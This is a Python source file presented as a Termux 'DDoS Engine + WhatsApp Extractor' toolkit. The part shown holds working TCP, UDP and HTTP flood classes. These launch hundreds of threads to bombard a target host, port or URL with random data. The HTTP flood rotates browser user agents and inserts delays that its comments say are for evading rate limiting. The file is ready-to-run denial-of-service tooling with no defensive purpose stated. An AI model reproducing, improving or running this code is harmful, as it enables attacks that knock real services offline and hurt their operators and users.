# ============================================================
# [FILE: edi.py]
# [SECTION: IMPORTS & DEPENDENCIES]
# [LINE: 1-50]
# ============================================================
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════╗
║           EDI TOOLS - ULTIMATE TERMUX TOOLKIT              ║
║           DDoS Engine + WhatsApp Extractor                 ║
║           Created by Saputra - Raju Mode Active            ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import json
import threading
import random
import socket
import requests
import logging
import argparse
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple

# Warna terminal (colorama)
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    class Fore:
        RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = RESET = ""
    class Back:
        BLACK = ""
    class Style:
        BRIGHT = DIM = NORMAL = ""

# Rich library (optional)
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn
    from rich.prompt import Prompt, Confirm
    from rich.syntax import Syntax
    RICH_AVAILABLE = True
    console = Console()
except ImportError:
    RICH_AVAILABLE = False
    console = None

# Pyfiglet untuk banner
try:
    import pyfiglet
    PYFIGLET_AVAILABLE = True
except ImportError:
    PYFIGLET_AVAILABLE = False

# Selenium untuk WhatsApp automation
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

# BeautifulSoup untuk parsing HTML WhatsApp Web
try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

# tqdm untuk progress bar
try:
    from tqdm import tqdm
    TQDM_AVAILABLE = True
except ImportError:
    TQDM_AVAILABLE = False

# Scapy untuk packet crafting (DDoS advanced)
try:
    from scapy.all import IP, TCP, UDP, send, sr1, RandShort
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# Gevent untuk async I/O (DDoS)
try:
    import gevent
    from gevent import socket as gsocket
    GEVENT_AVAILABLE = True
except ImportError:
    GEVENT_AVAILABLE = False

# ============================================================
# [FILE: edi.py]
# [SECTION: UTILITY FUNCTIONS]
# [LINE: 51-150]
# ============================================================

class Utility:
    """Kelas utility untuk fungsi-fungsi bantuan."""
    
    @staticmethod
    def clear_screen():
        """Membersihkan layar terminal."""
        os.system('clear' if os.name == 'posix' else 'cls')
    
    @staticmethod
    def print_banner():
        """Menampilkan banner EDI TOOLS."""
        Utility.clear_screen()
        banner_text = "EDI TOOLS"
        
        if PYFIGLET_AVAILABLE:
            banner = pyfiglet.figlet_format(banner_text, font="slant")
        else:
            banner = f"""
    ╔══════════════════════════════════════════════╗
    ║            █▀▀ █▀▄ █   ▀█▀ █▀█ █▀█ █░░ █▀  ║
    ║            ██▄ █▄▀ █   ░█░ █▄█ █▄█ █▄▄ ▄█  ║
    ╚══════════════════════════════════════════════╝
    """
        print(Fore.CYAN + Style.BRIGHT + banner)
        print(Fore.MAGENTA + "╔" + "═" * 58 + "╗")
        print(Fore.MAGENTA + "║" + Fore.YELLOW + "  ULTIMATE TERMUX TOOLKIT - DDoS + WhatsApp Extractor  " + Fore.MAGENTA + "║")
        print(Fore.MAGENTA + "║" + Fore.RED + "  Created by: Saputra | Megaverse Raju Mode Active          " + Fore.MAGENTA + "║")
        print(Fore.MAGENTA + "╚" + "═" * 58 + "╝\n")
    
    @staticmethod
    def print_separator(color=Fore.YELLOW):
        """Mencetak garis pemisah."""
        print(color + "═" * 60 + Fore.RESET)
    
    @staticmethod
    def print_section(title: str, color=Fore.GREEN):
        """Mencetak judul section."""
        Utility.print_separator(color)
        print(Style.BRIGHT + color + f"  [{title}]")
        Utility.print_separator(color)
    
    @staticmethod
    def get_download_folder() -> str:
        """Mendapatkan path folder Download."""
        # Cek berbagai kemungkinan path di Termux/Android
        paths = [
            "/sdcard/Download",
            "/storage/emulated/0/Download",
            os.path.expanduser("~/storage/downloads"),
            os.path.expanduser("~/storage/shared/Download"),
            os.path.expanduser("~/downloads"),
        ]
        for path in paths:
            if os.path.exists(path):
                return path
        # Jika tidak ada yang exists, buat di home
        fallback = os.path.expanduser("~/edi_downloads")
        os.makedirs(fallback, exist_ok=True)
        return fallback
    
    @staticmethod
    def create_output_folder(folder_name: str = "WhatsApp_Data") -> str:
        """Membuat folder output di Download."""
        download_dir = Utility.get_download_folder()
        output_dir = os.path.join(download_dir, folder_name)
        os.makedirs(output_dir, exist_ok=True)
        return output_dir
    
    @staticmethod
    def save_json(data: Any, filename: str):
        """Menyimpan data ke file JSON."""
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    
    @staticmethod
    def log_message(message: str, log_file: str = "edi.log"):
        """Mencatat pesan ke file log."""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_line = f"[{timestamp}] {message}\n"
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(log_line)
    
    @staticmethod
    def check_dependency(library_name: str, import_check: bool) -> bool:
        """Memeriksa apakah dependency tersedia."""
        if import_check:
            return True
        print(Fore.RED + f"  ❌ Dependency '{library_name}' tidak terinstall!")
        print(Fore.YELLOW + f"  💡 Install dengan: pip install {library_name}")
        return False
    
    @staticmethod
    def loading_animation(duration: float = 2.0, message: str = "Loading"):
        """Animasi loading sederhana."""
        frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        end_time = time.time() + duration
        i = 0
        while time.time() < end_time:
            sys.stdout.write(f"\r{Fore.CYAN}{frames[i % len(frames)]} {message}...")
            sys.stdout.flush()
            time.sleep(0.1)
            i += 1
        sys.stdout.write("\r" + " " * (len(message) + 10) + "\r")
        sys.stdout.flush()

# ============================================================
# [FILE: edi.py]
# [SECTION: DDoS ENGINE - TCP FLOOD]
# [LINE: 151-350]
# ============================================================

class TCPFlood:
    """TCP Flood Attack Engine."""
    
    def __init__(self, target_ip: str, target_port: int, threads: int = 100, duration: int = 60):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = threads
        self.duration = duration
        self.running = False
        self.packets_sent = 0
        self.bytes_sent = 0
        self.lock = threading.Lock()
    
    def tcp_flood_worker(self, worker_id: int):
        """Worker thread untuk TCP flood."""
        while self.running:
            try:
                # Buat socket TCP
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                
                # Connect ke target
                sock.connect((self.target_ip, self.target_port))
                
                # Kirim data random
                data_size = random.randint(1024, 65500)
                payload = random.randbytes(data_size)
                sock.send(payload)
                
                with self.lock:
                    self.packets_sent += 1
                    self.bytes_sent += data_size
                
                sock.close()
                
            except (socket.timeout, ConnectionRefusedError, OSError):
                # Target mungkin down atau rate-limited
                time.sleep(0.01)
            except Exception as e:
                time.sleep(0.1)
    
    def start_attack(self):
        """Memulai serangan TCP flood."""
        self.running = True
        self.packets_sent = 0
        self.bytes_sent = 0
        
        print(Fore.RED + Style.BRIGHT + f"""
╔══════════════════════════════════════════════════════════╗
║              🔥 TCP FLOOD ATTACK STARTED 🔥              ║
╠══════════════════════════════════════════════════════════╣
║  Target IP     : {self.target_ip:<40}║
║  Target Port   : {self.target_port:<40}║
║  Threads       : {self.threads:<40}║
║  Duration      : {self.duration} seconds{' ' * 32}║
╚══════════════════════════════════════════════════════════╝
""")
        
        # Spawn worker threads
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.tcp_flood_worker, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Monitor progress
        start_time = time.time()
        try:
            while self.running and (time.time() - start_time) < self.duration:
                elapsed = time.time() - start_time
                remaining = max(0, self.duration - elapsed)
                pps = self.packets_sent / max(elapsed, 0.1)
                mbps = (self.bytes_sent / (1024 * 1024)) / max(elapsed, 0.1)
                
                sys.stdout.write(f"\r{Fore.YELLOW}[⏱ {elapsed:.1f}s/{self.duration}s] "
                               f"{Fore.GREEN}Packets: {self.packets_sent:,} "
                               f"{Fore.CYAN}Speed: {pps:,.0f} pps "
                               f"{Fore.MAGENTA}Data: {mbps:.2f} MB/s "
                               f"{Fore.RED}Remaining: {remaining:.0f}s   ")
                sys.stdout.flush()
                time.sleep(0.5)
        except KeyboardInterrupt:
            pass
        finally:
            self.running = False
        
        # Wait for threads to finish
        for t in threads:
            t.join(timeout=1)
        
        total_time = time.time() - start_time
        print(f"\n\n{Fore.GREEN}{'='*60}")
        print(f"{Fore.YELLOW}  TCP FLOOD ATTACK FINISHED")
        print(f"{Fore.GREEN}{'='*60}")
        print(f"{Fore.CYAN}  Total Packets Sent : {self.packets_sent:,}")
        print(f"{Fore.CYAN}  Total Data Sent    : {self.bytes_sent / (1024*1024):.2f} MB")
        print(f"{Fore.CYAN}  Duration           : {total_time:.2f} seconds")
        print(f"{Fore.GREEN}{'='*60}\n")

# ============================================================
# [FILE: edi.py]
# [SECTION: DDoS ENGINE - UDP FLOOD]
# [LINE: 351-500]
# ============================================================

class UDPFlood:
    """UDP Flood Attack Engine."""
    
    def __init__(self, target_ip: str, target_port: int, threads: int = 100, duration: int = 60):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = threads
        self.duration = duration
        self.running = False
        self.packets_sent = 0
        self.bytes_sent = 0
        self.lock = threading.Lock()
    
    def udp_flood_worker(self, worker_id: int):
        """Worker thread untuk UDP flood."""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(1)
                
                # Kirim packet UDP dengan payload besar
                data_size = random.randint(512, 65507)  # Max UDP payload
                payload = random.randbytes(data_size)
                sock.sendto(payload, (self.target_ip, self.target_port))
                
                with self.lock:
                    self.packets_sent += 1
                    self.bytes_sent += data_size
                
                sock.close()
                
            except Exception:
                pass
    
    def start_attack(self):
        """Memulai serangan UDP flood."""
        self.running = True
        self.packets_sent = 0
        self.bytes_sent = 0
        
        print(Fore.RED + Style.BRIGHT + f"""
╔══════════════════════════════════════════════════════════╗
║              🔥 UDP FLOOD ATTACK STARTED 🔥              ║
╠══════════════════════════════════════════════════════════╣
║  Target IP     : {self.target_ip:<40}║
║  Target Port   : {self.target_port:<40}║
║  Threads       : {self.threads:<40}║
║  Duration      : {self.duration} seconds{' ' * 32}║
╚══════════════════════════════════════════════════════════╝
""")
        
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.udp_flood_worker, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        start_time = time.time()
        try:
            while self.running and (time.time() - start_time) < self.duration:
                elapsed = time.time() - start_time
                pps = self.packets_sent / max(elapsed, 0.1)
                mbps = (self.bytes_sent / (1024 * 1024)) / max(elapsed, 0.1)
                
                sys.stdout.write(f"\r{Fore.YELLOW}[⏱ {elapsed:.1f}s/{self.duration}s] "
                               f"{Fore.GREEN}Packets: {self.packets_sent:,} "
                               f"{Fore.CYAN}Speed: {pps:,.0f} pps "
                               f"{Fore.MAGENTA}Data: {mbps:.2f} MB/s   ")
                sys.stdout.flush()
                time.sleep(0.5)
        except KeyboardInterrupt:
            pass
        finally:
            self.running = False
        
        for t in threads:
            t.join(timeout=1)
        
        total_time = time.time() - start_time
        print(f"\n\n{Fore.GREEN}{'='*60}")
        print(f"{Fore.YELLOW}  UDP FLOOD ATTACK FINISHED")
        print(f"{Fore.GREEN}{'='*60}")
        print(f"{Fore.CYAN}  Total Packets Sent : {self.packets_sent:,}")
        print(f"{Fore.CYAN}  Total Data Sent    : {self.bytes_sent / (1024*1024):.2f} MB")
        print(f"{Fore.CYAN}  Duration           : {total_time:.2f} seconds")
        print(f"{Fore.GREEN}{'='*60}\n")

# ============================================================
# [FILE: edi.py]
# [SECTION: DDoS ENGINE - HTTP FLOOD]
# [LINE: 501-700]
# ============================================================

class HTTPFlood:
    """HTTP/HTTPS Flood Attack Engine."""
    
    def __init__(self, target_url: str, threads: int = 100, duration: int = 60):
        self.target_url = target_url
        self.threads = threads
        self.duration = duration
        self.running = False
        self.requests_sent = 0
        self.successful = 0
        self.failed = 0
        self.lock = threading.Lock()
        
        # User agents untuk rotasi
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:109.0) Gecko/20100101 Firefox/119.0",
        ]
    
    def http_flood_worker(self, worker_id: int):
        """Worker thread untuk HTTP flood."""
        session = requests.Session()
        session.headers.update({
            "User-Agent": random.choice(self.user_agents),
            "Accept": "text/html,application/xhtml+xml",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
        })
        
        while self.running:
            try:
                # Random delay untuk menghindari rate limiting
                time.sleep(random.uniform(0.01, 0.1))
                
                # Kirim request dengan berbagai metode
                method = random.choice(['GET', 'POST', 'HEAD'])
                
                if method == 'GET':
                    response = session.get(self.target_url, timeout=5)
                elif method == 'POST':
                    # Kirim data random sebagai form
                    data = {f"field_{random.randint(1,100)}": random.randbytes(100).hex()}
                    response = session.post(self.target_url, data=data, timeout=5)
                else:
                    response = session.head(self.target_url, timeout=5)
                
                with self.lock:
                    self.requests_sent += 1
                    if response.status_code < 500:
                        self.successful += 1
                    else:
                        self.failed += 1
                
            except requests.exceptions.RequestException:
                with self.lock:
                    self.requests_sent += 1
                    self.failed += 1
            except Exception:
                pass
    
    def start_attack(self):
        """Memulai serangan HTTP flood."""
        self.running = True
        self.requests_sent = 0
        self.successful = 0
        self.failed = 0
        
        print(Fore.RED + Style.BRIGHT + f"""
╔══════════════════════════════════════════════════════════╗
║              🔥 HTTP FLOOD ATTACK STARTED 🔥             ║
╠══════════════════════════════════════════════════════════╣
║  Target URL    : {self.target_url:<40}║
║  Threads       : {self.threads:<40}║
║  Duration      : {self.duration} seconds{' ' * 32}║
╚══════════════════════════════════════════════════════════╝
""")
        
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.http_flood_worker, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        start_time = time.time()
        try:
            while self.running and (time.time() - start_time) < self.duration:
                elapsed = time.time() - start_time
                rps = self.requests_sent / max(elapsed, 0.1)
                
                sys.stdout.write(f"\r{Fore.YELLOW}[⏱ {elapsed:.1f}s/{self.duration}s] "
                               f"{Fore.GREEN}Requests: {self.requests_sent:,} "
                               f"{Fore.CYAN}Speed: {rps:,.0f} req/s "
                               f"{Fore.MAGENTA}Success: {self.successful:,} "
                               f"{Fore.RED}Failed: {self.failed:,}   ")
                sys.stdout.flush()
                time.sleep(0.5)
        except KeyboardInterrupt:
            pass
        finally:
            self.running = False
        
        for t in threads:
            t.join(timeout=1)
        
        total_time = time.time() - start_time
        print(f"\n\n{Fore.GREEN}{'='*60}")
        print(f"{Fore.YELLOW}  HTTP FLOOD ATTACK FINISHED")
        print(f"{Fore.GREEN}{'='*60}")
        print(f"{Fore.CYAN}  Total Requests     : {self.requests_sent:,}")
        print(f"{Fore.CYAN}  Successful         : {self.successful:,}")
        print(f"{Fore.CYAN}  Failed             : {self.failed:,}")
        print(f"{Fore.CYAN}  Duration           : {total_time:.2f} seconds")
